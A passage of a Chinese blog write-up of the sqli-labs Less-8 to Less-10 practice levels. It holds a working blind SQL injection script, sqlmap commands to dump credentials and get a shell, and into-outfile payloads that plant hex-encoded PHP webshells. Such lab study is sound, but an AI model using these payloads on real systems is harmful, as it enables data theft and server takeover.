+                payload5 = "1' and (length((select group_concat(table_name) from information_schema.tables where table_schema = database())))="+str(i)+"-- ss"
+                param = {
+                "id":payload5,
+                }
+                response = requests.get(url, params = param, headers = headers)
+                if response.text.find(flag) != -1:
+                    length = i
+                    break
+            break
+        else:
+            break
+    print("the name of all tables in current database contains "+str(length)+" characters")
+    
+    for i in range(1,length+1):
+        for c in keylist:
+            payload6 = "1' and substr((select group_concat(table_name) from information_schema.tables where table_schema = database()),"+str(i)+",1)='"+c+"'-- ss"
+            param = {
+            "id":payload6,
+            }
+            response = requests.get(url, params = param, headers = headers)
+            if response.text.find(flag) != -1:
+                tname = tname+c
+                break
+    print("the name of all tables in current database is "+str(tname))
+
+
+def ColumnsGET(table):                                                          #table参数是需要爆破的数据表名称，记得加单引号
+    n = 200                                                                     #预测某个表所有列名称最大可能的长度，根据实际情况填写
+    k = 0
+    j = n//2
+    length = 0
+    cname = str()
+    while True:
+        if j&gt;k and j&lt;n and j-k&gt;3:
+            payload7 = "1' and (length((select group_concat(column_name) from information_schema.columns where table_name = '"+table+"' and table_schema = database())))&gt;"+str(j)+"-- ss"
+            param = {
+            "id":payload7,
+            }
+            response = requests.get(url, params = param, headers = headers)
+            if response.text.find(flag) != -1:
+                n=n
+                k=j
+            else:
+                k=k
+                n=j
+            j=(n-k)//2
+        elif j-k==3 or j-k&lt;3:
+            for i in range(k-1,n+2):
+                payload8 = "1' and (length((select group_concat(column_name) from information_schema.columns where table_name = '"+table+"' and table_schema = database())))="+str(i)+"-- ss"
+                param = {
+                "id":payload8,
+                }
+                response = requests.get(url, params = param, headers = headers)
+                if response.text.find(flag) != -1:
+                    length = i
+                    break
+            break
+        else:
+            break
+    print("the name of all columns in current table contains "+str(length)+" characters")
+    
+    for i in range(1,length+1):
+        for c in keylist:
+            payload9 = "1' and substr((select group_concat(column_name) from information_schema.columns where table_name = '"+table+"' and table_schema = database()),"+str(i)+",1)='"+c+"'-- ss"
+            param = {
+            "id":payload9,
+            }
+            response = requests.get(url, params = param, headers = headers)
+            if response.text.find(flag) != -1:
+                cname = cname+c
+                break
+    print("the name of all columns in current table is "+str(cname))
+
+def ContentGET(table,col1,col2):                                                #table参数是需要爆破的数据表名称，col1和col2是需要爆破内容的列，记得都要加单引号
+    n = 200                                                                     #预测期望获取的数据的最大可能的长度，根据实际情况填写
+    k = 0
+    j = n//2
+    length = 0
+    content = str()
+    while True:
+        if j&gt;k and j&lt;n and j-k&gt;3:
+            payload10 = "1' and (length((select group_concat(concat("+col1+",'^',"+col2+")) from "+table+")))&gt;"+str(j)+"-- ss"
+            param = {
+            "id":payload10,
+            }
+            response = requests.get(url, params = param, headers = headers)
+            if response.text.find(flag) != -1:
+                n=n
+                k=j
+            else:
+                k=k
+                n=j
+            j=(n-k)//2
+        elif j-k==3 or j-k&lt;3:
+            for i in range(k-1,n+2):
+                payload11 = "1' and (length((select group_concat(concat("+col1+",'^',"+col2+")) from "+table+")))="+str(i)+"-- ss"
+                param = {
+                "id":payload11,
+                }
+                response = requests.get(url, params = param, headers = headers)
+                if response.text.find(flag) != -1:
+                    length = i
+                    break
+            break
+        else:
+            break
+    print("the content contains "+str(length)+" characters")
+    
+    for i in range(1,length+1):
+        for c in keylist:
+            payload12 = "1' and substr((select group_concat(concat("+col1+",'^',"+col2+")) from "+table+"),"+str(i)+",1)='"+c+"'-- ss"
+            param = {
+            "id":payload12,
+            }
+            response = requests.get(url, params = param, headers = headers)
+            if response.text.find(flag) != -1:
+                content = content+c
+                break
+    print("the content is "+str(content))</code></pre>
+<p> 爆库结果：</p>
+<p><img alt="" height="254" src="https://img-blog.csdnimg.cn/20210816204803343.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2VsZXBoYW50eGlhbmc=,size_16,color_FFFFFF,t_70" width="966"/></p>
+<p> 接下来写webshell：</p>
+<pre><code>http://192.168.101.16/sqli-labs-master/Less-8/?id=1' into outfile 'C:/less8.php' lines terminated by 0x3c3f7068702061737365727428245f504f53545b6c657373385d293b3f3e-- s</code></pre>
+<p>服务器中写入的webshell如下：</p>
+<p><img alt="" height="61" src="image\20210816210314594.png" width="447"/></p>
+<p>本关代码如下，代码上看和上一关的主要区别在于数据库未查询到正确结果时，本关什么都不回显，注入逻辑上看其实没啥区别</p>
+<p><img alt="" height="755" src="image\20210816210437508.png" width="631"/></p>
+<p></p>
+<h1 id="Less-9">Less-9</h1>
+<p>本关不管id的值是数据库中存在的（<a href="http://192.168.101.16/sqli-labs-master/Less-4/?id=1">id=1</a>）还是不存在的（<a href="http://192.168.101.16/sqli-labs-master/Less-4/?id=1">id=-1</a>），页面回显都是一样的：</p>
+<p><img alt="" height="345" src="image\20210816210758314.png" width="1200"/></p>
+<p>输入<a href="http://192.168.101.16/sqli-labs-master/Less-9/?id=">http://192.168.101.16/sqli-labs-master/Less-9/?id=1' and if(1=1,sleep(2),0)-- s</a></p>
+<p>页面会过2s再刷新成功</p>
+<p>输入<a href="http://192.168.101.16/sqli-labs-master/Less-9/?id=">http://192.168.101.16/sqli-labs-master/Less-9/?id=1' and if(1=2,sleep(2),0)-- s</a></p>
+<p>页面立刻刷新成功</p>
+<p>本关可以用基于时间的盲注</p>
+<p>这关用sqlmap来试试，启动sqlmap并输入如下语句</p>
+<pre><code>#获取所有数据库名称
+python sqlmap.py -u "http://192.168.101.16/sqli-labs-master/Less-9/?id=1" --dbs
+#获取当前数据库
+python sqlmap.py -u "http://192.168.101.16/sqli-labs-master/Less-9/?id=1" --current-db
+#获取数据库security所有表名称
+python sqlmap.py -u "http://192.168.101.16/sqli-labs-master/Less-9/?id=1" --tables -D security
+#获取数据库security的users表的所有列名
+python sqlmap.py -u "http://192.168.101.16/sqli-labs-master/Less-9/?id=1" --columns -D security -T users
+#获取数据库security的users表的username和password列的值
+python sqlmap.py -u "http://192.168.101.16/sqli-labs-master/Less-9/?id=1" --dump -D security -T users -C username,password
+#写马
+python sqlmap.py -u "http://192.168.101.16/sqli-labs-master/Less-9/?id=1" --os-shell </code></pre>
+<p>爆库结果：</p>
+<p><img alt="" height="334" src="image\20210816212219716.png" width="298"/></p>
+<p>写马的时候，发生了一件令我<span style="color:#6eaad7;">疑惑的事情</span>，目录C:\phpstudy_pro\WWW下命令行shell和上传文件的shell都可以写成功，但目录C:\less9下只能写入上传文件的shell，并且sqlmap的返回结果说写shell失败。具体原因目前还不清楚。</p>
+<p>然后又发现一件搞笑的事情，我仔细一看，sqlmap不但识别出本关可以使用时间盲注，还识别出本关可以使用布尔盲注。并且看了本关文件夹下的result.txt之后发现，sqlmap最终选的注入方法是布尔盲注（好机智，毕竟时间盲注慢）。</p>
+<p><img alt="" height="187" src="image\20210816212241215.png" width="690"/></p>
+<p>看了本关代码之后发现，原来查询到结果和查询不到结果的返回页面有html代码上的区别……</p>
+<p><span style="color:#ed7976;">启示：以后遇到参数值输入正确和错误页面回显一样的情况，还得看看网页源代码</span></p>
+<p><img alt="" height="612" src="image\20210816213939387.png" width="652"/></p>
+<p>备注：本关也可以手工注入写马：</p>
+<pre><code>http://192.168.101.16/sqli-labs-master/Less-9/?id=1' into outfile 'C:/less9.php' lines terminated by 0x3C3F7068702061737365727428245F504F53545B6C657373395D293B3F3E-- s</code></pre>
+<p> 写入服务器的webshell：</p>
+<p><img alt="" height="76" src="image\20210816214926864.png" width="464"/></p>
+<p></p>
+<h1 id="Less-10">Less-10</h1>
+<p>本关不管id的值是数据库中存在的（<a href="http://192.168.101.16/sqli-labs-master/Less-4/?id=1">id=1</a>）还是不存在的（<a href="http://192.168.101.16/sqli-labs-master/Less-4/?id=1">id=-1</a>），页面回显都是一样的：</p>
+<p><img alt="" height="343" src="image\20210816214320512.png" width="1200"/></p>
+<p>查看网页源代码，下图是id=1的时候</p>
+<p><img alt="" height="405" src="image\20210816214407944.png" width="1093"/></p>
+<p> 下图是id=-1的时候</p>
+<p><img alt="" height="419" src="image\20210816215038831.png" width="1062"/></p>
+<p>差异还是挺明显的，所以这关也是可以进行布尔盲注的，可是标题说了time based所以……到底要不要给面子呢？</p>
+<p>还是给点面子吧^^</p>
+<p>这题如果用手工注入，可以试试改一改<a href="https://github.com/JacquelinXiang/sqli_blind">JacquelinXiang/sqli_blind: A simple tool/framework for boolean-based or time-based sql injection(blind) (github.com)</a>的<a href="https://github.com/JacquelinXiang/sqli_blind/blob/main/sqli_tb.py">sqli_tb.py</a></p>
+<p>我这里又偷懒了，用sqlmap来注入，payload和上一关差不多，但是要多加点参数（--technique T --level 3），具体如下：</p>
+<pre><code>#获取当前数据库
+python sqlmap.py -u "http://192.168.101.16/sqli-labs-master/Less-10/?id=1" --current-db --technique T --level 3
+#获取数据库security所有表名称
+python sqlmap.py -u "http://192.168.101.16/sqli-labs-master/Less-10/?id=1" --tables -D security --technique T --level 3
+#获取数据库security的users表的所有列名
+python sqlmap.py -u "http://192.168.101.16/sqli-labs-master/Less-10/?id=1" --columns -D security -T users --technique T --level 3
+#获取数据库security的users表的username和password列的值
+python sqlmap.py -u "http://192.168.101.16/sqli-labs-master/Less-10/?id=1" --dump -D security -T users -C username,password --technique T --level 3</code></pre>
+<p><strong>时间盲注真的很慢！！！能用别的就别用这个！！</strong></p>
+<p>手工注入一下webshell：</p>
+<p>先看看sqlmap注入用的payload，可见闭合是双引号</p>
+<p><img alt="" height="201" src="image\20210816221147507.png" width="729"/></p>
+<p> 所以可以用下面的payload来写webshell：</p>
+<pre><code>http://192.168.101.16/sqli-labs-master/Less-10/?id=1" into outfile 'C:/less10.php' lines terminated by 0x3C3F7068702061737365727428245F504F53545B6C65737331305D293B3F3E-- s</code></pre>
+<p>写入服务器的webshell：</p>
+<p><img alt="" height="47" src="image\2021081622140658.png" width="457"/></p>
+<p>本关代码和Less-9除了闭合不同也没啥不一样了……</p>
+<p><img alt="" height="552" src="image\20210816221459784.png" width="627"/></p>
+<p></p>
+<p></p>
+</div>
+</div>
